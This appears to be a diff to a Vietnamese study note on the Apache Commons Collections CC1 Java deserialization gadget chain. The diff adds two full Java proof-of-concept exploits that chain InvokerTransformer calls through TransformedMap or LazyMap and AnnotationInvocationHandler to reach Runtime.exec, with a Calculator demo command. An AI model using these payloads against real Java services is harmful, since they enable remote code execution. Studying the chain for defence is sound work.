@@ -4,7 +4,7 @@ commons-collections
 JDK7 OR JDK 8
 ```
 
-## Các interface và class liên quan
+## Các interface và class liên quan [link](https://www.cnblogs.com/rodericklog/articles/16340006.html)
 **1. Transform**
 
 1.1: Transformer
@@ -238,3 +238,139 @@ AnnotationInvocationHandler.readObject()
 - `factory` là cái gì? Khi kẻ tấn công khởi tạo LazyMap, họ truyền vào một đối tượng tên là Factory (thực chất chính là `ChainedTransformer` mà chúng ta đã đóng gói sẵn các lệnh độc hại).
 - Khi hàm get() không tìm thấy khóa (key), nó sẽ lập tức thực thi dòng lệnh:`ChainedTransformer` chính thức được kích hoạt
 - Khi phương thức `.transform()` của `ChainedTransformer` được gọi, nó sẽ chạy một vòng lặp qua từng phần tử trong mảng, lấy đầu ra của bộ biến đổi trước làm đầu vào cho bộ biến đổi tiếp theo
+
+
+
+POC CHAIN 1:
+```java
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.annotation.Retention;
+import java.lang.reflect.Constructor;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CC1 {
+    public static void main(String[] args) throws Exception {
+
+        Transformer[] transformers = new Transformer[] {
+                // Pass the Runtime class
+                new ConstantTransformer(Runtime.class),
+                // Reflectively call the getMethod method, which then reflectively calls getRuntime, returning the Runtime.getRuntime() method
+                new InvokerTransformer("getMethod",
+                        new Class[] {String.class, Class[].class },
+                        new Object[] {"getRuntime", new Class[0] }),
+                // Reflectively call the invoke method to execute Runtime.getRuntime(), returning the Runtime instance
+                new InvokerTransformer("invoke",
+                        new Class[] {Object.class, Object[].class },
+                        new Object[] {null, new Object[0] }),
+                // Reflectively call the exec method
+                new InvokerTransformer("exec",
+                        new Class[] {String.class },
+                        new Object[] {"open -a Calculator"})
+        };
+        
+        // Chain the 4 transformers together
+        Transformer transformerChain = new ChainedTransformer(transformers);
+
+        Map map = new HashMap();
+        map.put("value", "Roderick");
+        Map tmap = TransformedMap.decorate(map, null, transformerChain);
+        
+        // Reflectively obtain the AnnotationInvocationHandler constructor and pass tmap into it
+        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+        Constructor declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);
+        declaredConstructor.setAccessible(true);
+        Object o = declaredConstructor.newInstance(Retention.class, tmap);
+
+        // Serialize and write to file
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("outCC1.bin"));
+        oos.writeObject(o);
+        oos.close();
+
+/*
+        // Deserialize to trigger the payload
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("outCC1.bin"));
+        ois.readObject();
+        ois.close();
+*/
+    }
+}
+```
+
+
+POC CHAIN 2:
+```java
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.annotation.Retention;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CC1_2 {
+    public static void main(String[] args) throws Exception {
+        Transformer[] transformers = new Transformer[]{
+                // Pass the Runtime class
+                new ConstantTransformer(Runtime.class),
+                // Reflectively call the getMethod method, which then reflectively calls getRuntime, returning the Runtime.getRuntime() method
+                new InvokerTransformer("getMethod",
+                        new Class[]{String.class, Class[].class},
+                        new Object[]{"getRuntime", new Class[0]}),
+                // Reflectively call the invoke method to execute Runtime.getRuntime(), returning the Runtime instance
+                new InvokerTransformer("invoke",
+                        new Class[]{Object.class, Object[].class},
+                        new Object[]{null, new Object[0]}),
+                // Reflectively call the exec method
+                new InvokerTransformer("exec",
+                        new Class[]{String.class},
+                        new Object[]{"open -a Calculator"})
+        };
+        
+        // Chain the 4 transformers together
+        Transformer transformerChain = new ChainedTransformer(transformers);
+
+        Map map = new HashMap();
+        map.put("value", "Roderick");
+        Map tmap = LazyMap.decorate(map, transformerChain);
+
+        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+        Constructor declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);
+        declaredConstructor.setAccessible(true);
+      
+        InvocationHandler handler = (InvocationHandler) declaredConstructor.newInstance(Retention.class, tmap);
+        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler);
+        handler = (InvocationHandler) declaredConstructor.newInstance(Retention.class, proxyMap);
+        
+        /*        
+        // Serialize and write to file
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("outCC1.bin"));
+        oos.writeObject(handler);
+        oos.close();
+        */
+        
+        // Deserialize to trigger the payload
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("outCC1.bin"));
+        ois.readObject();
+        ois.close();
+    }
+}
+```
